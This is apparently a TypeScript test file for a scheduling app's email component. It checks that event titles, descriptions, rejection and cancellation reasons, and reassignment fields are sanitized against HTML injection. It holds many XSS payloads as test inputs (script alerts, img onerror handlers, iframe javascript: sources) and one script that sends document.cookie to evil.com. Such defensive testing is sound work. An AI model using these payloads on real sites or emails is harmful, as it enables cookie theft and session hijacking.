import { render } from "@testing-library/react";
import type { TFunction } from "i18next";
import { describe, expect, it } from "vitest";

import { TimeFormat } from "@calcom/lib/timeFormat";
import type { CalendarEvent, Person } from "@calcom/types/Calendar";

import { BaseScheduledEmail } from "./BaseScheduledEmail";

describe("BaseScheduledEmail HTML Injection Prevention", () => {
  const t = ((key: string, _args?: Record<string, unknown>) => key) as TFunction;

  const createMockCalEvent = (overrides: Partial<CalendarEvent> = {}): CalendarEvent => ({
    type: "test",
    title: "Test Event",
    description: "Test description",
    startTime: "2023-01-01T10:00:00Z",
    endTime: "2023-01-01T11:00:00Z",
    organizer: {
      email: "organizer@example.com",
      name: "Test Organizer",
      timeZone: "America/New_York",
      language: { translate: t, locale: "en" },
    },
    attendees: [
      {
        email: "attendee@example.com",
        name: "Test Attendee",
        timeZone: "America/New_York",
        language: { translate: t, locale: "en" },
      },
    ],
    location: "https://zoom.us/j/123456",
    additionalNotes: "Some additional notes",
    ...overrides,
  });

  const createMockAttendee = (overrides: Partial<Person> = {}): Person => ({
    email: "attendee@example.com",
    name: "Test Attendee",
    timeZone: "America/New_York",
    language: { translate: t, locale: "en" },
    ...overrides,
  });

  it("should sanitize rejection reason", () => {
    const maliciousCalEvent = createMockCalEvent({
      rejectionReason: "Rejected because <script>alert('xss')</script> malicious content",
    });

    const { container } = render(
      <BaseScheduledEmail
        calEvent={maliciousCalEvent}
        attendee={createMockAttendee()}
        timeZone="America/New_York"
        t={t}
        locale="en"
        timeFormat={TimeFormat.TWELVE_HOUR}
      />
    );

    // Should not contain malicious script content (MJML adds empty <script></script> tags for Outlook compatibility)
    expect(container.innerHTML).not.toContain("alert('xss')");
    expect(container.innerHTML).not.toContain("<script>alert");

    // Should contain sanitized content
    expect(container.innerHTML).toContain("Rejected because");
    expect(container.innerHTML).toContain("malicious content");
  });

  it("should sanitize cancellation reason", () => {
    const maliciousCalEvent = createMockCalEvent({
      cancellationReason: "Cancelled due to <img src=x onerror=alert('xss')> security issue",
    });

    const { container } = render(
      <BaseScheduledEmail
        calEvent={maliciousCalEvent}
        attendee={createMockAttendee()}
        timeZone="America/New_York"
        t={t}
        locale="en"
        timeFormat={TimeFormat.TWELVE_HOUR}
      />
    );

    // Should not contain malicious img tags or onerror attributes
    expect(container.innerHTML).not.toContain("onerror");
    expect(container.innerHTML).not.toContain("alert('xss')");
    expect(container.innerHTML).not.toContain("<img src=x");

    // Should contain sanitized content
    expect(container.innerHTML).toContain("Cancelled due to");
    expect(container.innerHTML).toContain("security issue");
  });

  it("should sanitize rescheduled by information", () => {
    const maliciousCalEvent = createMockCalEvent({
      rescheduledBy: "admin@example.com <script>alert('xss')</script>",
    });

    const { container } = render(
      <BaseScheduledEmail
        calEvent={maliciousCalEvent}
        attendee={createMockAttendee()}
        timeZone="America/New_York"
        t={t}
        locale="en"
        timeFormat={TimeFormat.TWELVE_HOUR}
      />
    );

    // Should not contain malicious script content
    expect(container.innerHTML).not.toContain("alert('xss')");
    expect(container.innerHTML).not.toContain("<script>alert");

    // Should contain sanitized content (dots are converted to [.] by sanitizeText)
    expect(container.innerHTML).toContain("admin@example[.]com");
  });

  it("should sanitize reassigned information (byUser case)", () => {
    const maliciousCalEvent = createMockCalEvent({});

    // When byUser is set, the component renders "reassigned_by" section (not "reassigned_to")
    const { container } = render(
      <BaseScheduledEmail
        calEvent={maliciousCalEvent}
        attendee={createMockAttendee()}
        timeZone="America/New_York"
        t={t}
        locale="en"
        timeFormat={TimeFormat.TWELVE_HOUR}
        reassigned={{
          name: "New Assignee <script>alert('xss')</script>",
          email: "new@example.com <iframe src=javascript:alert('xss')></iframe>",
          reason: "Reassigned because <img src=x onerror=alert('xss')>",
          byUser: "Admin <script>alert('xss')</script>",
        }}
      />
    );

    // Should not contain any malicious HTML content
    expect(container.innerHTML).not.toContain("<script>alert");
    expect(container.innerHTML).not.toContain("<img src=x");
    expect(container.innerHTML).not.toContain("onerror");
    expect(container.innerHTML).not.toContain("alert('xss')");

    // Should contain sanitized content for byUser case (reason and byUser are rendered)
    expect(container.innerHTML).toContain("Reassigned because");
    expect(container.innerHTML).toContain("Admin");
  });

  it("should sanitize reassigned information (reassigned_to case)", () => {
    const maliciousCalEvent = createMockCalEvent({});

    // When byUser is NOT set, the component renders "reassigned_to" section with name and email
    const { container } = render(
      <BaseScheduledEmail
        calEvent={maliciousCalEvent}
        attendee={createMockAttendee()}
        timeZone="America/New_York"
        t={t}
        locale="en"
        timeFormat={TimeFormat.TWELVE_HOUR}
        reassigned={{
          name: "New Assignee <script>alert('xss')</script>",
          email: "new@example.com <iframe src=javascript:alert('xss')></iframe>",
          reason: "Reassigned because <img src=x onerror=alert('xss')>",
        }}
      />
    );

    // Should not contain any malicious HTML content
    expect(container.innerHTML).not.toContain("<script>alert");
    expect(container.innerHTML).not.toContain("<iframe src=javascript");
    expect(container.innerHTML).not.toContain("<img src=x");
    expect(container.innerHTML).not.toContain("onerror");
    expect(container.innerHTML).not.toContain("javascript:alert");
    expect(container.innerHTML).not.toContain("alert('xss')");

    // Should contain sanitized content (sanitizeEmail preserves email format)
    expect(container.innerHTML).toContain("New Assignee");
    expect(container.innerHTML).toContain("new@example.com"); // sanitizeEmail preserves email format
    expect(container.innerHTML).toContain("Reassigned because");
  });

  it("should sanitize event title", () => {
    const maliciousCalEvent = createMockCalEvent({
      title: "Important Meeting <script>alert('xss')</script> with <img src=x onerror=alert('xss')>",
    });

    const { container } = render(
      <BaseScheduledEmail
        calEvent={maliciousCalEvent}
        attendee={createMockAttendee()}
        timeZone="America/New_York"
        t={t}
        locale="en"
        timeFormat={TimeFormat.TWELVE_HOUR}
      />
    );

    // Should not contain malicious HTML content
    expect(container.innerHTML).not.toContain("<script>alert");
    expect(container.innerHTML).not.toContain("<img src=x");
    expect(container.innerHTML).not.toContain("onerror");
    expect(container.innerHTML).not.toContain("alert('xss')");

    // Should contain sanitized content
    expect(container.innerHTML).toContain("Important Meeting");
    expect(container.innerHTML).toContain("with");
  });

  it("should sanitize event description", () => {
    const maliciousCalEvent = createMockCalEvent({
      description: "Event description with <iframe src=javascript:alert('xss')></iframe> malicious content",
    });

    const { container } = render(
      <BaseScheduledEmail
        calEvent={maliciousCalEvent}
        attendee={createMockAttendee()}
        timeZone="America/New_York"
        t={t}
        locale="en"
        timeFormat={TimeFormat.TWELVE_HOUR}
      />
    );

    // Should not contain malicious HTML
    expect(container.innerHTML).not.toContain("<iframe");
    expect(container.innerHTML).not.toContain("javascript:");
    expect(container.innerHTML).not.toContain("alert('xss')");

    // Should contain sanitized content
    expect(container.innerHTML).toContain("Event description with");
    expect(container.innerHTML).toContain("malicious content");
  });

  it("should handle complex HTML injection attempts", () => {
    const maliciousCalEvent = createMockCalEvent({
      title: "Meeting <script>document.location='http://evil.com/steal.php?cookie='+document.cookie</script>",
      description:
        "Description <img src=x onerror=alert('xss')> <iframe src=javascript:alert('xss')></iframe>",
      rejectionReason: "Rejected <script>alert('xss')</script> <img src=x onerror=alert('xss')>",
    });

    const { container } = render(
      <BaseScheduledEmail
        calEvent={maliciousCalEvent}
        attendee={createMockAttendee()}
        timeZone="America/New_York"
        t={t}
        locale="en"
        timeFormat={TimeFormat.TWELVE_HOUR}
      />
    );

    // Should not contain any malicious HTML content
    expect(container.innerHTML).not.toContain("<script>document.location");
    expect(container.innerHTML).not.toContain("<img src=x");
    expect(container.innerHTML).not.toContain("<iframe src=javascript");
    expect(container.innerHTML).not.toContain("onerror");
    expect(container.innerHTML).not.toContain("javascript:alert");
    expect(container.innerHTML).not.toContain("document.location");
    expect(container.innerHTML).not.toContain("alert('xss')");

    // Should contain sanitized content
    expect(container.innerHTML).toContain("Meeting");
    expect(container.innerHTML).toContain("Description");
    expect(container.innerHTML).toContain("Rejected");
  });

  it("should preserve legitimate content", () => {
    const legitimateCalEvent = createMockCalEvent({
      title: "Normal Meeting Title",
      description: "Normal event description with numbers 123 and symbols @#$%",
      rejectionReason: "Legitimate rejection reason",
    });

    const { container } = render(
      <BaseScheduledEmail
        calEvent={legitimateCalEvent}
        attendee={createMockAttendee()}
        timeZone="America/New_York"
        t={t}
        locale="en"
        timeFormat={TimeFormat.TWELVE_HOUR}
      />
    );

    // Should contain all legitimate content
    expect(container.innerHTML).toContain("Normal Meeting Title");
    expect(container.innerHTML).toContain("Normal event description with numbers 123 and symbols @#$%");
    expect(container.innerHTML).toContain("Legitimate rejection reason");
  });

  it("should handle empty or null values gracefully", () => {
    const emptyCalEvent = createMockCalEvent({
      title: "",
      description: "",
      rejectionReason: "",
      cancellationReason: "",
    });

    const { container } = render(
      <BaseScheduledEmail
        calEvent={emptyCalEvent}
        attendee={createMockAttendee()}
        timeZone="America/New_York"
        t={t}
        locale="en"
        timeFormat={TimeFormat.TWELVE_HOUR}
      />
    );

    // Should render without errors
    expect(container.innerHTML).toBeDefined();
    expect(container.innerHTML).not.toContain("undefined");
    expect(container.innerHTML).not.toContain("null");
  });

  it("should keep location URLs clickable for meeting links", () => {
    const calEventWithUrl = createMockCalEvent({
      location: "https://zoom.us/j/123456789",
    });

    const { container } = render(
      <BaseScheduledEmail
        calEvent={calEventWithUrl}
        attendee={createMockAttendee()}
        timeZone="America/New_York"
        t={t}
        locale="en"
        timeFormat={TimeFormat.TWELVE_HOUR}
      />
    );

    // Location URLs should remain clickable as they are legitimate meeting links
    // (unlike user-provided text fields which get sanitized)
    expect(container.innerHTML).toContain("https://zoom.us/j/123456789");
  });
});
